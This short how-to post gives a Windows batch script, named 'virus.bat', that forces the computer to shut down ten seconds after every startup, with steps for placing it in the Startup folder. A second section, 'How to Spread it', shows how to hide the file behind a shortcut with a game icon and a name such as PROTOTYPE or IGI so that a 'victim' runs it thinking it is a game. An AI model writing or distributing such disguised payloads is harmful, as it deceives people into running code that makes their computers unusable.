Shutdown the computer every time on startup!
Here is how ?

? Open Notepad

? Type :

@ECHO OFF

shutdown -s -t 10 -c “Virus Attack…”

exit

? File >> Save As…

? Name it: virus.bat

? Start >> All Programs

? Right Click on Startup >> Open

? This open the Startup folder

? Paste the Virus.bat file here!

*** That’s all, now the computer will

automatically shut down on every startup!

How to Spread it:

Windows doesn’t allow to change the icon of .bat files. Therefore what you can do is :

Right-click on the .bat file
Click on CREATE SHORTCUT
And hide the original file.
Now as this newly created file is just the shortcut, you can easily change its icon.
Right-click on this shortcut
properties >>>..cutomize>>..choose icon
Now give an attractive icon to it.
Now name it something interesting. eg. PROTOTYPE or IGI etc.
Now your victim would think it to be the game, and he will be easily corrupted.
